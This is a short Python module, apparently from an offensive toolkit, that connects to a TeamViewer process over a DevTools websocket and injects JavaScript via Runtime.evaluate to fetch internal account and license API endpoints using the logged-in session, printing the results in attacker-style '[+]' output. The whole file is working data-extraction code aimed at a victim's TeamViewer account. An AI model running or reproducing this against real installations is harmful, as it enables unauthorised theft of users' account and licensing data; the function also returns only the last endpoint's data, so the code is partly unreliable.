"""
teamviewer_account_extraction.py -- Account and license data
Extracts information of the account associated with TeamViewer.
"""
import websocket
import json

INTERNAL_DOMAIN = "https://teamviewer-internal-<HASH>"

def extract_account_info(ws):
    """Extract account and license data."""
    endpoints = {
        "account": f"{INTERNAL_DOMAIN}/api/account/v1/account",
        "licenses": f"{INTERNAL_DOMAIN}/api/account/v1/licenses",
    }

    for name, url in endpoints.items():
        js = f"""
        (async () => {{
            const r = await fetch('{url}');
            return JSON.stringify(await r.json());
        }})()
        """

        ws.send(json.dumps({
            "id": 20,
            "method": "Runtime.evaluate",
            "params": {"expression": js, "awaitPromise": True}
        }))

        result = json.loads(ws.recv())
        data = json.loads(result["result"]["result"]["value"])

        print(f"[+] Endpoint: {name}")
        for key, val in data.items():
            val_str = str(val)[:60]
            print(f"    {key}: {val_str}")
        print()

    return data
